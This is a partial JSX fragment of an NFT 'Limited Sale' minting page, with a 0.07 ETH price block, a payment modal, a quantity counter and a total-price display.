        ...
        <div className="header-cont">
            ...
            <div className="header_flex">
                ...
                <div className="dutch-detail-two-sides">
                    ...
                    <div className="dutch-det-right">
                        <div className="text-block-12">0.07 ETH</div>
                    </div>
                </div>
                <div className="dutch-detail-two-sides">
                    <div className="dutch-det-left">
            ...
            <div id="claim-text-wrapper">
                <div id="payment-modal">
                    <div id="payment-header">
                        <div id="payment-header-text" style={{ margin: '0 auto' }}  >
                            <h1 className="heading-2-copy-copy-copy-copy"
                                style={{ margin: '0', padding: 0, fontStyle: 'initial' }}><span
                                    style={{ textTransform: 'none' }}>Limited Sale</span></h1>
                        </div>
                    </div>
                    <div id="payment-info" style={{ marginTop: '20px' }}><img id="price-img"
                        src="/asserts/media/image/gifius.gif" alt="Claim NFT" />
                    ...
                    <div id="ape-number">
                        <div id="minus" onClick={onDecrease} className="minuson">
                            <svg width="12" height="2" viewBox="0 0 16 2" fill="none"
                                xmlns="http://www.w3.org/2000/svg" style={{ left: '11px' }}>
                                <path
                        ...
                        <h5 id="pricex" style={{ marginLeft: "13px", marginRight: "13px" }}>{counter}</h5>
                        <input name="eth" className="eth_input text-field-5 w-input" type="hidden" min="1" max="10"
                            pattern="[A-z0-9]{2,50}" required value="1" />
                    ...
                    <div id="ape-total">
                        <p>Total</p>
                        <h5><span id="price">{price.toFixed(2)}</span> ETH</h5>
                    </div>
                </div>
